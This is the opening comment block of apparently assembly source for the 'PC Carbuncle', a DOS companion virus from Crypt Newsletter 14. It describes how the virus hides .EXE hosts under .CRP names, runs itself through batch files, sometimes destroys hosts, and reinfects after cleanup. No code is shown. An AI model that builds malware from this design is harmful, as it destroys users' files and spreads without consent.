;The PC CARBUNCLE VIRUS - a companion virus for Crypt Newsletter 14                
;The PC Carbuncle is a "toy" virus which will search out every .EXEfile
;in the current directory, rename it with a .CRP [for Crypt] extent and
;create a batchfile.  The batchfile calls the PC Carbuncle [which has
;copied itself to a hidden file in the directory], renames the host
;file to its NORMAL extent, executes it, hides it as a .CRP file once
;again and issues a few error messages.  The host files function
;normally. Ocassionaly, the PC Carbuncle will copy itself to a few
;of the host .CRP files, destroying them.  The majority of the host
;files in the PC Carbuncle-controlled directory will continue to function,
;in any case.  If the user discovers the .CRP and .BAT files and is smart
;enough to delete the batchfiles and rename the .CRP hosts to their
;normal .EXE extents, the .CRPfiles which have been infected by the
;virus will re-establish the infection in the directory.
